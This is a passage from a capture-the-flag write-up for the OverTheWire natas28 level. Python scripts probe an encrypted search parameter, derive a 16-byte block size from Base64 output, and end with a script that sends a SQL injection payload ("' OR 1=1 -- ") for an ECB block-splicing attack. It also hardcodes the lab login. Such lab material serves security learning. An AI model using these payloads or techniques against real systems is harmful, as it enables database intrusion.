G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo/rTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc+W8qVURZGUeQT0sqvywtdoaqcqUxUclw
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk+TeoJCUeZlbnESzUa
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiCmh+TDOtWa4NEQcBXdALKw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeVHYCtS+uFWasjpcfkfbWBUHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepFqT7keU0bYgT7CSC2jyfWSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7aEY+Zn5SV6PPZc/umUoo4lt6QiE+GEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe8pCcTVN4HuF3egErsaclQaCVIvMBz502rHAj8WWUjFqXOc2QUi+nqG+VdztW+fjA
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo3OKX/tKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO/KQD0d1/VBE/QY9Jva7f3NLQciZ
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12/MXUZMaiIebtmORiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo+zTb4/ZFk1ANUDkSXB9J+VCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1rvKpl9ojY/cqP60zLRc2+nc/MYUJSqAUCPH5fQN9OFZ4xXc+zCj4cOT068bIBwpA==
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4klFYz8WsBtIr/aC3LI8VGnfo7Rqr4LXQXE/+asFCOrR46xof4mGixsFQYRCbP+2g==
```

The start `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP` is common.

Now try with a query of a single letter varying:

```python
import requests
import urllib
import string


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    query = ""
    for letter in letters:
        print(send_request(session, letter))
```

The result is interesting:

```
python natas29.py
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYiwNnSJY7KHJGU+XjuMzVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKEMZKNASy09t5ooTNAbaX0vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKnMw6aSOWjayIcOCUAu7bVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIeoxGWFgXHXykQlH86OpiMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKX9Nbu3XXL5PIaYqiW14GSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLV4wF7G0i3DftMhPsAyZVqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIJJW40OKGV9h7fJBqf28f9vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLMEPlGOfuQ7a1fFtCB5a1XvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPICgQ0oynl6FWbVHY/8dJkIvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLnuAD+NGYcU1yTMgoFGDHHvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIskS5tRSHzosjTBciCi/8VvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJTwbPiFdKuTtoify+YlBFLvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKvKlZ1HHFG9tUyBWOMONORvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIPdJbPB4AWVinSFPLRB1eYvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKD30n5dTLLZ3c/Rs9/bQwwvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKghh12LRBJ55334nG5LgfxvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKef8vfXgzqiOnKBXb2kd2cvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI+jVOKpzBAHVGo0XIzCijxvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKLbhtgC4p7C+91shiGBL15vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIRwoUdFyCT68E7RwSyaxRSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIae8xMT+8hwEi33FOpyUlmvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKlwoXvDTqKtYfcUSRUbdOSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJXwBmXBeBRhwrvq1HTCwh/vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL7EnsTc1X3234z1DMqyjsMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJDB5EyzqNqQNuIYdASJqV6vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJjS9S3adXJc/WWvI3XdcvzvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIV6guc0zYmhS2FK2WeDX9XvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJPZL/HuhXFCvKgIB2/Zln5vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJibK/FTJvyvXqxFb51bhV1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJhFsli4K/fPeKT4M8Ry23kvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKOKpwR3/gkTIMH8U7dhu4GvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIDMQGG2abZtjOsSZs1X39vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKOvt9wFI9mjTVoT/tGtl7FvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL5KLXni7y8eqJFwXWh1DUnvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPITdJXBsJQLwvXAvasuKjoevfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI2LEeQPtPKos7Cg24MI6rXvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIFr55FtnKO9tEyQa/+96tovfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKQYCy/DcTbyaMyrOKXW+nmvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJXWuUtLaAhQY1GD/2pLpWBvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJslle8BYSivKdpv1B2Y01FvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJaGM8iPTFRQd0Zmcxed5mevfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJiDv3VFbwCsAwUlLNbD2BFvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ3Nmyh1ZS++nAIX1FELIkMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJO9/z7rq/TbEgCDg6ebTA6vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJs9IckNOkzgew37TadMpVqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJHdksLJFuUJ3MlCTPRoS7rvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLxGu5bRS4vnVo0bm1VgVobvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI3GgIRwkWmfdd+oEfVBISnvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK6wkS+fLmU8WdWdeOrvNlhvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLPP49oqlQoQMK4BitKnvvEvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
```

There is a common ending part: `vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=` (and there remains the common starting part `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP`).

We can study a little bit better the results of our queries with the following script:
```python
import requests
import urllib
import string

from utils import utils


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    letter_to_responses = {}
    session = requests.Session()
    session.auth = basic_auth
    query = ""
    for letter in letters:
        letter_to_responses[letter] = send_request(session, letter)
    responses = list(letter_to_responses.values())
    prefix = utils.common_prefix_list(responses)
    suffix = utils.common_suffix_list(responses)
    print(f"Common prefix: {prefix}")
    print(f"Common suffix: {suffix}")
    different_parts = {k: s[len(prefix):len(s) - len(suffix)] for k, s in letter_to_responses.items()}
    for k, s in different_parts.items():
        print(f"{k}: {s}")
```

The output:
```
Common prefix: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
Common suffix: vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
a: KriAqPE2++uYlniRMkobB1
b: IYiwNnSJY7KHJGU+XjuMzV
c: KEMZKNASy09t5ooTNAbaX0
d: KnMw6aSOWjayIcOCUAu7bV
e: IeoxGWFgXHXykQlH86OpiM
f: KX9Nbu3XXL5PIaYqiW14GS
g: LV4wF7G0i3DftMhPsAyZVq
h: IJJW40OKGV9h7fJBqf28f9
i: LMEPlGOfuQ7a1fFtCB5a1X
j: ICgQ0oynl6FWbVHY/8dJkI
k: LnuAD+NGYcU1yTMgoFGDHH
l: IskS5tRSHzosjTBciCi/8V
m: JTwbPiFdKuTtoify+YlBFL
n: KvKlZ1HHFG9tUyBWOMONOR
o: IPdJbPB4AWVinSFPLRB1eY
p: KD30n5dTLLZ3c/Rs9/bQww
q: Kghh12LRBJ55334nG5Lgfx
r: Kef8vfXgzqiOnKBXb2kd2c
s: I+jVOKpzBAHVGo0XIzCijx
t: KLbhtgC4p7C+91shiGBL15
u: IRwoUdFyCT68E7RwSyaxRS
v: Iae8xMT+8hwEi33FOpyUlm
w: KlwoXvDTqKtYfcUSRUbdOS
x: JXwBmXBeBRhwrvq1HTCwh/
y: L7EnsTc1X3234z1DMqyjsM
z: JDB5EyzqNqQNuIYdASJqV6
A: Kjd8MKDZZIiKG51FNeoPjU
B: JjS9S3adXJc/WWvI3Xdcvz
C: IV6guc0zYmhS2FK2WeDX9X
D: JPZL/HuhXFCvKgIB2/Zln5
E: JibK/FTJvyvXqxFb51bhV1
F: JhFsli4K/fPeKT4M8Ry23k
G: KOKpwR3/gkTIMH8U7dhu4G
H: KIDMQGG2abZtjOsSZs1X39
I: KOvt9wFI9mjTVoT/tGtl7F
J: L5KLXni7y8eqJFwXWh1DUn
K: ITdJXBsJQLwvXAvasuKjoe
L: I2LEeQPtPKos7Cg24MI6rX
M: IFr55FtnKO9tEyQa/+96to
N: KQYCy/DcTbyaMyrOKXW+nm
O: JXWuUtLaAhQY1GD/2pLpWB
P: Jslle8BYSivKdpv1B2Y01F
Q: JaGM8iPTFRQd0Zmcxed5me
R: JiDv3VFbwCsAwUlLNbD2BF
S: J3Nmyh1ZS++nAIX1FELIkM
T: JO9/z7rq/TbEgCDg6ebTA6
U: Js9IckNOkzgew37TadMpVq
V: JHdksLJFuUJ3MlCTPRoS7r
W: LxGu5bRS4vnVo0bm1VgVob
X: I3GgIRwkWmfdd+oEfVBISn
Y: K6wkS+fLmU8WdWdeOrvNlh
Z: LPP49oqlQoQMK4BitKnvvE
```

Try now varying the length of the query:
```python
import requests
import urllib
import string

from utils import utils


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    letter_to_responses = {}
    session = requests.Session()
    session.auth = basic_auth
    query = ""
    for i in range(40):
        query = "a" * i
        letter_to_responses[query] = send_request(session, query)
    responses = list(letter_to_responses.values())
    prefix = utils.common_prefix_list(responses)
    suffix = utils.common_suffix_list(responses)
    print(f"Common prefix: {prefix}")
    print(f"Common suffix: {suffix}")
    different_parts = {k: s[len(prefix):len(s) - len(suffix)] for k, s in letter_to_responses.items()}
    for k, s in different_parts.items():
        print(f"{s}")
```

The output:
```
Common prefix: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
Common suffix:
Lof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
KriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
KxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
IvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
I1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
LDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
JKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
Kf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
JFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
KeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
LAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
LAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
LAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
LAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
LAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
LAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo/rTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
LAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
LAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc+W8qVURZGUeQT0sqvywtdoaqcqUxUclw
LAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
LAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk+TeoJCUeZlbnESzUa
LAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
LAhy3ui8kLEVaROwiiI6OeiCmh+TDOtWa4NEQcBXdALKw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
LAhy3ui8kLEVaROwiiI6OeVHYCtS+uFWasjpcfkfbWBUHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
LAhy3ui8kLEVaROwiiI6OepFqT7keU0bYgT7CSC2jyfWSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
LAhy3ui8kLEVaROwiiI6Oe7aEY+Zn5SV6PPZc/umUoo4lt6QiE+GEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
LAhy3ui8kLEVaROwiiI6Oe8pCcTVN4HuF3egErsaclQaCVIvMBz502rHAj8WWUjFqXOc2QUi+nqG+VdztW+fjA
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo3OKX/tKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO/KQD0d1/VBE/QY9Jva7f3NLQciZ
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12/MXUZMaiIebtmORiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo+zTb4/ZFk1ANUDkSXB9J+VCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1rvKpl9ojY/cqP60zLRc2+nc/MYUJSqAUCPH5fQN9OFZ4xXc+zCj4cOT068bIBwpA==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4klFYz8WsBtIr/aC3LI8VGnfo7Rqr4LXQXE/+asFCOrR46xof4mGixsFQYRCbP+2g==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo634oa0Bd+0eytOsfBCCqp69+hBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1PZSZ68rWhh8Et83CTzBGJIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6VJ/aUrbZtOJjLbMYOIVtWaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqoyARu+SI3eG77JYbYXCzDhIpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4gpofkwzrVmuDREHAV3QCysO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF+on86ew==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1R2ArUvrhVmrI6XH5H21gVBwJjEus3F7ZNXVk5RBd1+ZNDcyGglNpKt/L03ltG/ig==
LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6Rak+5HlNG2IE+wkgto8n1khpVK6kb7k+mrhYRbT0vQ1/8rclRT/ClHAeUfXXwPjg==
```

The common part `LAhy3ui8kLEVaROwiiI6Oe` appearing at a certain point has length:
```python
>>> print(len("LAhy3ui8kLEVaROwiiI6Oe"))
22
```

We learn [online](https://i.sstatic.net/DEB8w.png) that $3n$ bytes are Base64-encoded to $4n$ characters.

Thus, a string of $n$ bytes will be encoded to $\lceil{4n\over 3}\rceil$ bytes.

Reversing this:
```
>>> len("LAhy3ui8kLEVaROwiiI6Oe") / 4 * 3
16.5
```

This gives us the block size, which will be $16$.

Analogous can be calculated from another common part appearing in the following queries: `s5A4wo33m2XSYVHfWPfqo`:
```
>>> import math
>>> math.ceil(len("s5A4wo33m2XSYVHfWPfqo") / 4 * 3)
16
```

The script injecting the malicious query:
```python
import requests
import urllib
import string
import os
import base64

from utils import utils


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="

def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    inner_block_query = "          "
    res_inner_block = send_request(session, inner_block_query)
    inner_block = res_inner_block[len(prefix):len(res_inner_block) - len(suffix)]
    query = "AAAAAAAAA' OR 1=1 -- " # The final space is necessary!
    res = send_request(session, query)
